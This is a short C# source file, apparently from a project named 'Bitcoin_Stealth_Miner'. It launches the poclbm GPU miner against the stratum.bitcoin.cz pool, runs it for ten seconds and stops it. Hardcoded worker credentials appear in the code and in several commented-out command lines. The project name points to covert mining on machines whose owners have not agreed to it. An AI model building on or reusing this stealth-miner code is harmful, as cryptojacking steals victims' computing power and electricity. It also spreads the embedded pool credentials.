using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SlushMiner;

namespace Bitcoin_Stealth_Miner {
    class Program {
        #region Main

        //poclbm.exe elibelash.elibelash:qweqwe@api2.bitcoin.cz:8332 --device=0 --platform=0 --verbose -r1 

        static void Main(string[] args) {
            Console.Title = "Miner";
            Miner.MinerLocation = "poclbm"+Miner.SystemBits+"\\";
            //http://stratum.bitcoin.cz:3333/
            //api2.bitcoin.cz", 8332
            Miner.Start("stratum.bitcoin.cz", 3333, "elibelash.elibelash", "qweqwe");
            Thread.Sleep(10000);
            Miner.Stop();
            //poclbm.exe -d1 --SERVER=stratum.bitcoin.cz --port=3333 --user=elibelash.elibelash --pass=qweqwe --device=0 -v
            //poclbm.exe -r 1 --verbose -v http://elibelash.elibelash:qweqwe@stratum.bitcoin.cz:3333
            //poclbm.exe -r 1 -v http://elibelash.elibelash:qweqwe@stratum.bitcoin.cz:3333

            

            Console.Read();
        }

        #endregion
    }
}
